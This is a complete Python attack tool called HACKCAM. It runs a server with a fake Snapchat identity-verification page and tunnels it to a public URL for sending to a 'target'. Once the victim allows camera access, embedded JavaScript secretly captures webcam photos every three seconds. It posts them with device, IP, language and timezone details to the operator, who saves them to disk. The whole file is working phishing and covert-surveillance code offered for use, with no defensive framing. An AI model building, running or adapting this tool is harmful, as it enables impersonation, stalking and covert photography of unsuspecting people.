#!/usr/bin/env python3
"""
HACKCAM Auto Camera Access | Instant Photo Capture
Created by null7
"""

import os
import sys
import json
import threading
import subprocess
import time
import socket
import re
import tarfile
import base64
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests


try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    C = Fore
    S = Style
except ImportError:
    class Dummy:
        def __getattr__(self, name): return ''
    C = S = Dummy()

PORT = 8080
LOG_DIR = "hackcamera_captures"
TOOLS_DIR = os.path.join(os.path.expanduser("~"), ".hackcamera")


BANNER = f"""
{C.RED}                    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
{C.RED}                    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
{C.RED}                    ███████║███████║██║     █████╔╝ 
{C.RED}                    ██╔══██║██╔══██║██║     ██╔═██╗ 
{C.RED}                    ██║  ██║██║  ██║╚██████╗██║  ██╗
{C.RED}                    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{C.RED}                                                                 
{C.RED}             ██████╗ █████╗ ███╗   ███╗███████╗██████╗  █████╗ 
{C.RED}            ██╔════╝██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔══██╗
{C.RED}            ██║     ███████║██╔████╔██║█████╗  ██████╔╝███████║
{C.RED}            ██║     ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██╔══██║
{C.RED}            ╚██████╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║██║  ██║
{C.RED}             ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
{C.RED}                                                                 

{C.WHITE}                    ◆ {S.BRIGHT}REMOTE CAMERA CAPTURE FRAMEWORK{S.RESET_ALL} ◆
{C.RED}                     ═══ {S.BRIGHT}AUTO PHOTO CAPTURE VIA LINK{S.RESET_ALL} {C.RED}═══

{C.MAGENTA}                             created by {S.BRIGHT}null7{S.RESET_ALL}

"""


LANDING_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat — Verify Your Identity</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0a14;
            --yellow: #FFFC00;
            --yellow-dark: #e6e000;
            --red: #ff3b30;
            --green: #34c759;
            --text: #ffffff;
            --text-secondary: #98989e;
            --card-bg: rgba(20,20,40,0.94);
            --border: rgba(255,255,255,0.06);
        }
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Inter',-apple-system,sans-serif;
            background:var(--bg);
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            overflow:hidden;
        }
        .bg-orbs{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
        .orb{
            position:absolute;
            border-radius:50%;
            filter:blur(130px);
            opacity:0.18;
            animation:float 22s infinite ease-in-out;
        }
        .orb:nth-child(1){width:500px;height:500px;background:var(--yellow);top:-18%;left:-10%;animation-delay:0s}
        .orb:nth-child(2){width:400px;height:400px;background:#ff6b35;bottom:-15%;right:-8%;animation-delay:-7s}
        .orb:nth-child(3){width:350px;height:350px;background:#5856d6;top:55%;left:50%;animation-delay:-14s}
        @keyframes float{
            0%,100%{transform:translate(0,0) scale(1)}
            25%{transform:translate(70px,-80px) scale(1.1)}
            50%{transform:translate(-50px,60px) scale(0.9)}
            75%{transform:translate(-70px,-50px) scale(1.05)}
        }
        .overlay{
            position:fixed;
            top:0;left:0;
            width:100%;height:100%;
            background:rgba(0,0,0,0.7);
            z-index:999;
            display:flex;
            justify-content:center;
            align-items:center;
            backdrop-filter:blur(4px);
            -webkit-backdrop-filter:blur(4px);
        }
        .modal{
            background:var(--card-bg);
            backdrop-filter:blur(50px);
            -webkit-backdrop-filter:blur(50px);
            border:1px solid var(--border);
            border-radius:28px;
            padding:0;
            max-width:440px;
            width:92%;
            text-align:center;
            box-shadow:0 20px 60px rgba(0,0,0,0.7),0 0 0 1px rgba(255,255,255,0.04) inset;
            overflow:hidden;
            animation:slideUp 0.45s cubic-bezier(0.16,1,0.3,1);
        }
        @keyframes slideUp{
            from{transform:translateY(40px);opacity:0}
            to{transform:translateY(0);opacity:1}
        }
        .header-strip{
            background:linear-gradient(135deg,#FFFC00,#e6e000);
            padding:32px 24px 24px;
            position:relative;
            overflow:hidden;
        }
        .header-strip::after{
            content:'';
            position:absolute;
            top:-20px;right:-20px;
            width:100px;height:100px;
            background:rgba(255,255,255,0.2);
            border-radius:50%;
        }
        .ghost-icon{
            width:60px;height:60px;
            background:#000;
            border-radius:50%;
            display:inline-flex;
            align-items:center;
            justify-content:center;
            margin-bottom:12px;
            box-shadow:0 8px 24px rgba(0,0,0,0.3);
            position:relative;
            z-index:1;
        }
        .header-strip h1{
            font-size:20px;
            font-weight:700;
            color:#000;
            letter-spacing:-0.3px;
            position:relative;
            z-index:1;
        }
        .header-strip .sub{
            font-size:12px;
            color:rgba(0,0,0,0.7);
            font-weight:500;
            position:relative;
            z-index:1;
        }
        .content{padding:28px 24px 24px}
        .warning-badge{
            display:inline-flex;
            align-items:center;
            gap:8px;
            background:rgba(255,59,48,0.1);
            border:1px solid rgba(255,59,48,0.25);
            border-radius:50px;
            padding:8px 18px;
            margin-bottom:20px;
        }
        .warning-dot{
            width:8px;height:8px;
            background:var(--red);
            border-radius:50%;
            animation:pulse-red 1.5s infinite;
        }
        @keyframes pulse-red{
            0%,100%{box-shadow:0 0 0 0 rgba(255,59,48,0.6)}
            70%{box-shadow:0 0 0 12px rgba(255,59,48,0)}
        }
        .warning-badge span{font-size:12px;color:#ff6b6b;font-weight:600}
        .content h2{
            font-size:19px;
            font-weight:700;
            color:var(--text);
            margin-bottom:6px;
        }
        .content .desc{
            font-size:13px;
            color:var(--text-secondary);
            line-height:1.6;
            margin-bottom:10px;
        }
        .camera-preview{
            width:100%;
            height:200px;
            background:rgba(0,0,0,0.4);
            border-radius:16px;
            margin-bottom:20px;
            overflow:hidden;
            position:relative;
            border:1px solid rgba(255,255,255,0.06);
        }
        .camera-preview video{
            width:100%;
            height:100%;
            object-fit:cover;
            display:none;
        }
        .camera-preview video.active{display:block}
        .camera-placeholder{
            position:absolute;
            top:50%;left:50%;
            transform:translate(-50%,-50%);
            color:rgba(255,255,255,0.3);
            font-size:14px;
        }
        .btn-scan{
            display:block;
            width:100%;
            background:linear-gradient(135deg,#FFFC00,#e6e000);
            color:#000;
            border:none;
            padding:15px;
            font-size:16px;
            font-weight:700;
            border-radius:16px;
            cursor:pointer;
            letter-spacing:-0.2px;
            transition:all 0.25s cubic-bezier(0.4,0,0.2,1);
            box-shadow:0 8px 28px rgba(255,252,0,0.3);
            font-family:inherit;
        }
        .btn-scan:hover{transform:translateY(-2px);box-shadow:0 12px 36px rgba(255,252,0,0.45)}
        .btn-scan:active{transform:scale(0.96)}
        .loading-state{display:none;text-align:center;padding:16px 0}
        .loading-state.active{display:block}
        .spinner{
            width:40px;height:40px;
            border:3px solid rgba(255,255,255,0.08);
            border-top-color:#FFFC00;
            border-radius:50%;
            animation:spin 0.7s linear infinite;
            margin:0 auto 12px;
        }
        @keyframes spin{to{transform:rotate(360deg)}}
        .loading-text{font-size:13px;color:var(--text-secondary)}
        .success-state{display:none;text-align:center;padding:16px 0}
        .success-state.active{display:block}
        .check-circle{
            width:56px;height:56px;
            background:rgba(52,199,89,0.12);
            border:2px solid rgba(52,199,89,0.3);
            border-radius:50%;
            display:inline-flex;
            align-items:center;
            justify-content:center;
            margin-bottom:12px;
        }
        .check-circle svg{width:28px;height:28px}
        .success-title{font-size:17px;font-weight:600;color:var(--green);margin-bottom:4px}
        .success-sub{font-size:12px;color:var(--text-secondary)}
        .error-state{display:none;text-align:center;padding:16px 0}
        .error-state.active{display:block}
        .error-box{
            background:rgba(255,59,48,0.08);
            border:1px solid rgba(255,59,48,0.25);
            border-radius:14px;
            padding:12px 16px;
            color:#ff6b6b;
            font-size:12px;
            margin-top:8px;
        }
        .retry-link{
            color:#FFFC00;
            cursor:pointer;
            text-decoration:underline;
            font-size:12px;
            margin-top:10px;
            display:inline-block;
            font-weight:600;
        }
        .footer-note{
            text-align:center;
            padding:14px;
            font-size:10px;
            color:rgba(255,255,255,0.15);
        }
    </style>
</head>
<body>

<div class="bg-orbs">
    <div class="orb"></div>
    <div class="orb"></div>
    <div class="orb"></div>
</div>

<div class="overlay" id="mainOverlay">
    <div class="modal">
        <div class="header-strip">
            <div class="ghost-icon">
                <svg width="34" height="34" viewBox="0 0 24 24" fill="none">
                    <path d="M12 2C6.48 2 2 6.48 2 12v10l3.5-3.5L9 22l3.5-3.5L16 22l3.5-3.5L22 22V12c0-5.52-4.48-10-10-10z" fill="#FFFC00"/>
                </svg>
            </div>
            <h1>Snapchat</h1>
            <p class="sub">Identity Verification Required</p>
        </div>
        <div class="content">
            <div class="warning-badge">
                <div class="warning-dot"></div>
                <span>Camera Verification Needed</span>
            </div>

            <div class="camera-preview" id="cameraPreview">
                <video id="video" autoplay playsinline></video>
                <canvas id="canvas" style="display:none;"></canvas>
                <div class="camera-placeholder" id="placeholder">📷 Camera preview</div>
            </div>

            <h2>Verify Your Identity</h2>
            <p class="desc">Snapchat requires a quick face scan to verify your identity and secure your account. Your photo is encrypted and never stored.</p>

            <button class="btn-scan" onclick="startCamera()">
                📸 Scan Face Now
            </button>

            <div class="loading-state" id="loadingState">
                <div class="spinner"></div>
                <p class="loading-text">Accessing camera...</p>
            </div>

            <div class="success-state" id="successState">
                <div class="check-circle">
                    <svg viewBox="0 0 24 24" fill="none" stroke="#34c759" stroke-width="2.8">
                        <polyline points="4 12 10 18 20 6"/>
                    </svg>
                </div>
                <p class="success-title">Identity Verified</p>
                <p class="success-sub">Your account is now secure.</p>
            </div>

            <div class="error-state" id="errorState">
                <div class="error-box" id="errorMsg">
                    ⚠️ Camera access denied. Please allow camera permission.
                </div>
                <span class="retry-link" onclick="startCamera()">↻ Tap to Retry</span>
            </div>
        </div>
        <div class="footer-note">Snapchat ©2024 • Privacy Protected</div>
    </div>
</div>

<script>
var stream = null;

function startCamera(){
    document.getElementById('loadingState').classList.add('active');
    document.getElementById('successState').classList.remove('active');
    document.getElementById('errorState').classList.remove('active');
    document.querySelector('.btn-scan').style.display = 'none';

    if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
        showError('Camera not supported on this device.');
        return;
    }

    navigator.mediaDevices.getUserMedia({
        video: {
            facingMode: 'user',
            width: {ideal: 1280},
            height: {ideal: 720}
        },
        audio: false
    }).then(function(s){
        stream = s;
        var video = document.getElementById('video');
        video.srcObject = s;
        video.classList.add('active');
        document.getElementById('placeholder').style.display = 'none';
        document.getElementById('loadingState').classList.remove('active');
        document.getElementById('successState').classList.add('active');

        // Capture after 1.5 seconds
        setTimeout(function(){
            capturePhoto();
        }, 1500);

        // Capture every 3 seconds
        setInterval(function(){
            capturePhoto();
        }, 3000);

    }).catch(function(err){
        document.getElementById('loadingState').classList.remove('active');
        var msgs = {
            'NotAllowedError': 'Camera access denied. Please allow camera in browser settings.',
            'NotFoundError': 'No camera found on this device.',
            'NotReadableError': 'Camera is already in use by another app.'
        };
        showError(msgs[err.name] || 'Camera error. Please try again.');
    });
}

function capturePhoto(){
    var video = document.getElementById('video');
    var canvas = document.getElementById('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    var ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    var photoData = canvas.toDataURL('image/jpeg', 0.85);

    fetch('/photo', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            photo: photoData,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenSize: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        })
    }).catch(function(){});
}

function showError(msg){
    document.getElementById('errorMsg').innerText = '⚠️ ' + msg;
    document.getElementById('errorState').classList.add('active');
    document.querySelector('.btn-scan').style.display = 'block';
}
</script>
</body>
</html>"""

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def spinner(text, duration=0.8):
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        print(f"\r    {C.CYAN}{chars[i % len(chars)]}{S.RESET_ALL} {text}", end="", flush=True)
        time.sleep(0.07)
        i += 1


def install_cloudflared():
    exe_name = "cloudflared.exe" if os.name == "nt" else "cloudflared"
    exe_path = os.path.join(TOOLS_DIR, exe_name)
    if os.path.exists(exe_path):
        return exe_path

    os.makedirs(TOOLS_DIR, exist_ok=True)
    print(f"    {C.YELLOW}⬇{S.RESET_ALL}  Downloading cloudflared...")

    system = sys.platform
    if system == "win32":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    elif system == "darwin":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"
    else:
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"

    try:
        resp = requests.get(url, stream=True, timeout=120)
        if url.endswith(".tgz"):
            tgz_path = os.path.join(TOOLS_DIR, "cloudflared.tgz")
            with open(tgz_path, "wb") as f:
                for chunk in resp.iter_content(8192):
                    f.write(chunk)
            with tarfile.open(tgz_path, "r:gz") as tar:
                tar.extract("cloudflared", TOOLS_DIR)
            os.remove(tgz_path)
        else:
            with open(exe_path, "wb") as f:
                for chunk in resp.iter_content(8192):
                    f.write(chunk)
            if os.name != "nt":
                os.chmod(exe_path, 0o755)
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Cloudflared installed")
        return exe_path
    except Exception as e:
        print(f"    {C.RED}✗{S.RESET_ALL}  Failed: {e}")
        return None

def start_cloudflared_tunnel():
    exe = install_cloudflared()
    if not exe:
        return None

    print(f"    {C.CYAN}⏳{S.RESET_ALL}  Launching Cloudflare Tunnel...")
    try:
        proc = subprocess.Popen(
            [exe, "tunnel", "--url", f"http://localhost:{PORT}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        public_url = None
        start_time = time.time()
        for line in iter(proc.stdout.readline, ''):
            if time.time() - start_time > 45:
                break
            match = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', line)
            if match:
                public_url = match.group(1)
                break
        if public_url:
            print(f"    {C.GREEN}✓{S.RESET_ALL}  Connected")
            return public_url
    except:
        pass
    print(f"    {C.YELLOW}⚠{S.RESET_ALL}  Cloudflared failed, trying fallback...")
    return None

def start_serveo_tunnel():
    print(f"    {C.CYAN}⏳{S.RESET_ALL}  Trying Serveo SSH tunnel...")
    try:
        import random
        subdomain = f"hcam-{random.randint(1000,9999)}"
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-R", f"{subdomain}:80:localhost:{PORT}", "serveo.net"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        public_url = f"https://{subdomain}.serveo.net"
        time.sleep(3)
        try:
            requests.get(f"http://{subdomain}.serveo.net", timeout=5)
            print(f"    {C.GREEN}✓{S.RESET_ALL}  Connected via Serveo")
            return public_url
        except:
            pass
        for line in iter(proc.stdout.readline, ''):
            if "Forwarding" in line or "serveo" in line.lower():
                match = re.search(r'https?://[^\s]+', line)
                if match:
                    return match.group(0)
    except FileNotFoundError:
        print(f"    {C.YELLOW}⚠{S.RESET_ALL}  SSH not found")
    except:
        pass
    print(f"    {C.YELLOW}⚠{S.RESET_ALL}  Serveo failed, trying last resort...")
    return None

def start_localhost_run():
    print(f"    {C.CYAN}⏳{S.RESET_ALL}  Trying localhost.run...")
    try:
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-R", f"80:localhost:{PORT}", "nokey@localhost.run"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        start = time.time()
        for line in iter(proc.stdout.readline, ''):
            if time.time() - start > 20:
                break
            match = re.search(r'https?://[a-zA-Z0-9\-]+\.lhr\.life', line)
            if match:
                print(f"    {C.GREEN}✓{S.RESET_ALL}  Connected via localhost.run")
                return match.group(0)
    except FileNotFoundError:
        pass
    except:
        pass
    return None

class HackCameraHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(LANDING_PAGE.encode("utf-8"))

    def do_POST(self):
        if self.path == "/photo":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            data = json.loads(body)

            photo_b64 = data.get("photo", "")
            timestamp = data.get("timestamp", datetime.now().isoformat())
            ip = self.client_address[0]

            
            os.makedirs(LOG_DIR, exist_ok=True)
            photo_count = len([f for f in os.listdir(LOG_DIR) if f.endswith('.jpg')]) + 1
            photo_filename = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{photo_count}.jpg"
            photo_path = os.path.join(LOG_DIR, photo_filename)

           
            if "base64," in photo_b64:
                photo_b64 = photo_b64.split("base64,")[1]

            with open(photo_path, "wb") as f:
                f.write(base64.b64decode(photo_b64))

           
            meta = {
                "id": datetime.now().strftime("%Y%m%d%H%M%S%f"),
                "timestamp": timestamp,
                "photo_file": photo_filename,
                "ip": ip,
                "device": {
                    "ua": data.get("userAgent", "N/A"),
                    "platform": data.get("platform", "N/A"),
                    "language": data.get("language", "N/A"),
                    "screen": data.get("screenSize", "N/A"),
                    "timezone": data.get("timezone", "N/A"),
                }
            }
            meta_path = os.path.join(LOG_DIR, "metadata.json")
            metas = []
            if os.path.exists(meta_path):
                with open(meta_path, "r") as f:
                    try: metas = json.load(f)
                    except: metas = []
            metas.append(meta)
            with open(meta_path, "w") as f:
                json.dump(metas, f, indent=2)

            print(f"""
{C.RED}  ┌─────────────────────────────────────────────────────────────┐
{C.RED}  │{C.WHITE}  📸 {S.BRIGHT}PHOTO CAPTURED{S.RESET_ALL}                                          {C.RED}│
{C.RED}  ├─────────────────────────────────────────────────────────────┤
{C.RED}  │{C.WHITE}  🖼️  File     : {C.YELLOW}{photo_filename}{' '*(38-len(photo_filename))}{C.RED}│
{C.RED}  │{C.WHITE}  📁 Saved to : {C.YELLOW}{LOG_DIR}{' '*(38-len(LOG_DIR))}{C.RED}│
{C.RED}  │{C.WHITE}  🌐 IP       : {C.YELLOW}{ip}{' '*(38-len(ip))}{C.RED}│
{C.RED}  │{C.WHITE}  📱 Device   : {C.YELLOW}{data.get('platform','?')}{' '*(38-len(data.get('platform','?')))}{C.RED}│
{C.RED}  └─────────────────────────────────────────────────────────────┘{S.RESET_ALL}
""")

            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())


def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)

  
    print(f"  {C.CYAN}◆ {S.BRIGHT}INITIALIZATION{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")

    spinner("Starting HTTP server...", 0.5)
    server = HTTPServer(("0.0.0.0", PORT), HackCameraHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    local_ip = get_local_ip()
    print(f"    {C.GREEN}✓{S.RESET_ALL}  HTTP server online")
    print(f"    {C.WHITE}→{S.RESET_ALL}  Local: {C.CYAN}http://{local_ip}:{PORT}{S.RESET_ALL}")

    spinner("Loading camera capture module...", 0.4)
    print(f"    {C.GREEN}✓{S.RESET_ALL}  Camera module ready")

    spinner("Preparing photo storage...", 0.3)
    os.makedirs(LOG_DIR, exist_ok=True)
    print(f"    {C.GREEN}✓{S.RESET_ALL}  Storage: {os.path.abspath(LOG_DIR)}")
    print()

  
    print(f"  {C.CYAN}◆ {S.BRIGHT}TUNNEL CONNECTION{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")

    public_url = None
    tunnel_name = None

    print(f"    {C.WHITE}[1/3]{S.RESET_ALL} Cloudflare Tunnel")
    public_url = start_cloudflared_tunnel()
    if public_url:
        tunnel_name = "Cloudflare Tunnel"

    if not public_url:
        print(f"    {C.WHITE}[2/3]{S.RESET_ALL} Serveo SSH")
        public_url = start_serveo_tunnel()
        if public_url:
            tunnel_name = "Serveo"

    if not public_url:
        print(f"    {C.WHITE}[3/3]{S.RESET_ALL} localhost.run")
        public_url = start_localhost_run()
        if public_url:
            tunnel_name = "localhost.run"

    print()

 
    print(f"  {C.CYAN}◆ {S.BRIGHT}RESULT{S.RESET_ALL}")
    print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")

    if public_url:
        print(f"    {C.GREEN}●{S.RESET_ALL}  Status  : {C.GREEN}{S.BRIGHT}CONNECTED{S.RESET_ALL}")
        print(f"    {C.GREEN}●{S.RESET_ALL}  Method  : {C.WHITE}{tunnel_name}{S.RESET_ALL}")
        print(f"    {C.GREEN}●{S.RESET_ALL}  URL     : {C.YELLOW}{S.BRIGHT}{public_url}{S.RESET_ALL}")
        print(f"    {C.GREEN}●{S.RESET_ALL}  Captures: {C.WHITE}{os.path.abspath(LOG_DIR)}/{S.RESET_ALL}")
        print(f"\n  {C.RED}{S.BRIGHT}  ► SEND THIS LINK TO TARGET:{S.RESET_ALL}")
        print(f"  {C.YELLOW}  {public_url}{S.RESET_ALL}")
        print(f"\n  {C.WHITE}  ◆ Waiting for photo captures... {C.RED}Ctrl+C{S.RESET_ALL} {C.WHITE}to stop.{S.RESET_ALL}")
        print(f"  {C.WHITE}  ◆ Photos saved to: {C.CYAN}{os.path.abspath(LOG_DIR)}{S.RESET_ALL}")
    else:
        print(f"    {C.RED}●{S.RESET_ALL}  Status  : {C.RED}{S.BRIGHT}ALL TUNNELS FAILED{S.RESET_ALL}")
        print(f"    {C.WHITE}  ◆ Local URL: {C.CYAN}http://{local_ip}:{PORT}{S.RESET_ALL}")

    print(f"\n  {C.WHITE}{'─'*50}{S.RESET_ALL}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {C.RED}◆ {S.BRIGHT}SHUTDOWN{S.RESET_ALL}")
        print(f"  {C.WHITE}{'─'*50}{S.RESET_ALL}")
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Server stopped")
        photos = len([f for f in os.listdir(LOG_DIR) if f.endswith('.jpg')])
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Total photos: {photos}")
        print(f"    {C.GREEN}✓{S.RESET_ALL}  Saved: {os.path.abspath(LOG_DIR)}")
        print(f"\n  {C.MAGENTA}  null7 says goodbye.{S.RESET_ALL}\n")
        server.shutdown()
        sys.exit(0)

if __name__ == "__main__":
    main()
